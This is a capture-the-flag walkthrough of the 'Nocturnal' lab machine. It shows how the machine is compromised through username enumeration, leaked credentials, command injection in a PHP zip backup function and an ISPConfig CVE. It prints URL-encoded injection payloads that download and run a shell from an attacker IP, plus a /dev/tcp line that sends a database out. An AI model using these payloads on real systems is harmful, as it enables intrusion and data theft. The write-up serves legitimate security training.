# Nocturnal

```
Difficulty: Easy
Operating System: Linux
Hints: True
```

##  Summary

| Step | User / Access   | Technique Used                          | Result                                                                                  |
| :--- | :------------- | :-------------------------------------- | :-------------------------------------------------------------------------------------- |
| 1    | `N/A`          | Port Scanning                           | Found HTTP (nginx 1.18) and SSH (OpenSSH 8.2) services.                                 |
| 2    | `N/A`          | Username Enumeration                     | Enumerated users (`admin`, `amanda`, `tobias`) via URL parameter with ffuf.            |
| 3    | `amanda`       | File Analysis / Backup                   | Downloaded `privacy.odt` and extracted Amanda’s password.                               |
| 4    | `tobias`       | Database Access / Password Cracking      | Logged in to backend, created backup, retrieved and cracked Tobias's password.          |
| 5    | `www-data`     | Command Injection in Backup Function    | Exploited zip backup password injection to execute shell commands and retrieve DB file. |
| 6    | `N/A`          | SSH Local Port Forwarding                | Forwarded intranet port 8080 to local machine to access ISPConfig service.              |
| 7    | `root`         | ISPConfig CVE-2023-46818 Exploit        | Used code injection exploit to gain root privileges on the system.                     |



## Nmap Enumeration

```bash
[root@kali] /home/kali/Nocturnal  
❯ nmap Nocturnal.htb -sV -A
````

**Nmap Results:**

| Port   | State | Service | Version                          |
| ------ | ----- | ------- | -------------------------------- |
| 22/tcp | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 |
| 80/tcp | open  | http    | nginx 1.18.0 (Ubuntu)            |



---

## User Enumeration

1. Register a user and log in.
2. Upload any file to check download links:

```
http://nocturnal.htb/view.php?username=<USERNAME>&file=2023.xlsx
```

3. Enumerate usernames using **ffuf**:

```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=2023.xlsx' \
-w ../Desktop/fuzzDicts/userNameDict/user.txt \
-H 'Cookie: PHPSESSID=k381a2of6lftuk6gnab5f5sapa' \
-fs 2985
```

**Discovered Users:**

* `admin`
* `amanda`
* `tobias`

4. Check files for **amanda**, find `privacy.odt`:

```bash
file privacy.odt
# Output: Zip archive, with extra data prepended
```

* Decompress and extract **password** from this file.

---

## User Password Extraction

1. Log in to the admin interface using amanda’s credentials.
2. Create a backup from the admin panel (set a password).
3. Download and decompress the backup file to retrieve database files.
4. Use amanda's password to obtain password hashes.
5. Crack **tobias’s password** successfully.

---

## Code Analysis (Post-Update)

* Database backup functionality in `admin.php`:

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) return false;
    }
    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}

$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

* **Vulnerability:** Password field is directly spliced into the `zip` command; partial blacklist is insufficient.
* **Exploit:** Use URL encoding to inject commands:

```text
password=%0Abash%09-c%09"id"%0A&backup=
password=%0Abash%09-c%09"wget%0910.xx.xx.xx/shell"%0A&backup=
password=%0Abash%09-c%09"bash%09shell"%0A&backup=
```

* Transfer the database file to your machine:

```bash
www-data@nocturnal:~/nocturnal_database$ cat nocturnal_database.db > /dev/tcp/10.xx.xx.xx/8888
```

```bash
[root@kali] /home/kali/Nocturnal  
❯ nc -lvnp 8888 > nocturnal_database.db
```

---

## Root Access

1. Found intranet service on port `8080`.
2. SSH tunneling to local machine:

```bash
ssh tobias@nocturnal.htb -L 9090:127.0.0.1:8080
```

3. Identified **ISPConfig** service (possibly version 3.2).
4. Exploit **CVE-2023-46818** for code injection:

* Search: `bipbopbup/CVE-2023-46818-python-exploit`

* Use to gain root access.

* **Tip:** Check for password reuse between users and services.

---



**Takeaways:**

* Always sanitize user input properly for command execution.
* Backup files and database exports can leak credentials if not protected.
* Internal services can provide privilege escalation paths when exposed internally.
